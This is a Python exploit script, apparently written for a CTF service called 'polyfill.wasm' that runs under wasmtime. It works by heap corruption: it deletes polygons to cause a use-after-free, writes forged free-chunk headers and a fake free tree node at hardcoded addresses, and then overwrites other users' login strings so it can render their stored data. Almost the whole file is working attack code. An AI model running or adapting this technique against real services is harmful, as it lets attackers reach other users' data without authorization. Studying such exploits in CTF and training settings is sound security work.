#!/usr/bin/python3

import subprocess
import random
import struct

def cmd(p, text, expected_output=1):
    p.stdin.write(text + "\n")
    first = p.stdout.readline().strip()
    for i in range(expected_output-1):
        p.stdout.readline()
    return(first)


def write_mem_two_bytes(p, idx, pos, b1, b2):
    if b1 == 0 and b2 == 0:
        cmd(p, "del_point %d %d" % (idx, pos//2))
    else:
        cmd(p, "add_point %d %d %d %d" % (idx, pos//2, b1, b2))


def write_mem_int(p, idx, pos, val):
    mem_val = struct.pack("<I", val)
    write_mem_two_bytes(p, idx, pos, mem_val[0], mem_val[1])
    write_mem_two_bytes(p, idx, pos+2, mem_val[2], mem_val[3])


def write_mem_str(p, idx, pos, val):
    val = val.encode() + b"\x00" * 2
    for i in range(len(val) // 2):
        write_mem_two_bytes(p, idx, pos+i*2, val[i*2], val[i*2+1])


def hack(p, logins):
    login = "hack_%012d" % random.randrange(10**12)
    print("registering as", login)

    p.stdin.write(login + "\n")
    p.stdin.write("mypassword\n")
    p.stdin.write("mysecret\n")

    print("creating the poly (4 times)")
    for i in range(4):
        cmd(p, "new_poly")
    print("copying second poly to other frame (25 times)")
    for i in range(25):
        cmd(p, "copy_poly 1 1")

    print("deleting polys (24 times) from frame 1")
    cmd(p, "set_frame 1")
    for i in range(24):
        cmd(p, "del_poly %d" % i)

    print("deleting second poly from frame 1")
    cmd(p, "set_frame 0")
    cmd(p, "del_poly 1")
    cmd(p, "set_frame 1")

    print("writing fake forward pointer to the freed chunk")
    mem_addr = 0x205a0
    write_mem_int(p, 24, 0, mem_addr + 72)

    print("writing fake freed chunk headers")
    write_mem_int(p, 24, 72+1*4, 13*8)
    write_mem_int(p, 24, 72+2*4, 0x494)
    write_mem_int(p, 24, 72+3*4, mem_addr - 8)

    print("creating two polys, the second one is on fake free space")
    cmd(p, "new_poly")
    cmd(p, "new_poly")

    print("using the second poly to create fake free node")
    print("making it big size to make it store as tree")
    print("the pointers on parent and child nodes are faked")
    write_mem_int(p, 1, 5*4, 301)

    write_mem_int(p, 1, 7*4, 0x20600)
    write_mem_int(p, 1, 8*4, 0x000200e0-4*13)
    write_mem_int(p, 1, 9*4, 0x000200e0-4*13)
    write_mem_int(p, 1, 10*4, 0x00020148+25*4+20)
    write_mem_int(p, 1, 11*4, 0x1)

    print("deleting the first poly to making our fake occupied node free")
    cmd(p, "del_poly 0")

    print("rewriting the pointer on poly 10 on the frame 1")

    for login in logins:
        print("overwriting login on", login)
        write_mem_str(p, 10, 4*13, login)
        print(cmd(p, "render", expected_output=26))


def get_logins(p):
    logins = []
    avail_logins_prompt = p.stdout.readline()
    while True:
        buf = p.stdout.readline().strip()
        if "Please log in or register" in buf:
            break
        logins.append(buf)
    return [l for l in logins if "hack" not in l]


with subprocess.Popen(["wasmtime", "--dir", "flags", "polyfill.wasm"], encoding="utf8", bufsize=0,
                      stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
                      stderr=subprocess.DEVNULL
                      ) as p:
    welcome_prompt = p.stdout.readline()
    logins = get_logins(p)
    print("got logins:", " ".join(logins))

    hack(p, logins)
